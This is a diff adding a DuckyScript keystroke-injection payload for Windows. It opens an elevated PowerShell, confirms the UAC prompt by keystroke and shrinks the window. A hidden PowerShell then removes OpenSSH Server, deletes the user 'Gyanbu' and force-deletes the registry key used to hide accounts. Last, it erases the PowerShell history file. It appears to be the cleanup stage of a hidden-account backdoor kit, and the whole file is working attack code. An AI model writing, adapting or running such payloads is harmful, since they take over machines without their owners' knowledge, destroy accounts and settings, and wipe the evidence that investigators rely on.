@@ -1,0 +1,24 @@
+DELAY 1000
+REM Open Run prompt
+GUI r
+DELAY 1000
+REM Start elevared PowerShell
+STRING PowerShell Start-Process -Verb runAs PowerShell
+ENTER
+DELAY 5000
+ALT y
+ALT t
+DELAY 5000
+REM Shrink PowerShell window
+STRING mode con cols=20 lines=1
+ENTER
+REM Preparing hidden PowerShell window for payload
+STRING Start-Process -WindowStyle Hidden PowerShell "
+REM Payload
+STRING Remove-WindowsCapability -Online -Name OpenSSH.Server~~~~0.0.1.0;
+STRING net user Gyanbu /delete;
+STRING Remove-Item 'HKLM:\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon\SpecialAccounts\UserList' -Force
+REM End of payload
+REM Clear PowerShell history and exit
+STRING ";(Get-PSReadlineOption).HistorySavePath | rm;exit
+ENTER
